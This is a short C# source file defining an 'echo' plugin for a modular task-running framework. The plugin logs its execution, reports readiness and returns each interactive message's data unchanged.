using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IInteractiveModule, IModule
    {
        public string Name => "echo";
        private IDataBroker messageManager { get; set; }

        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            messageManager.AddInteractMessage(new InteractMessage()
            {
                task_id = job.task.id,
                data = Misc.Base64Encode("Ready to echo"),
                message_type = InteractiveMessageType.Output,
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }

        public async void Interact(InteractMessage message)
        {
            DebugLog.Log($"{Name} Interact received [{message.task_id}]");
            messageManager.AddInteractMessage(new InteractMessage()
            {
                task_id = message.task_id,
                data = message.data,
                message_type = InteractiveMessageType.Output,
            });
        }
    }
}
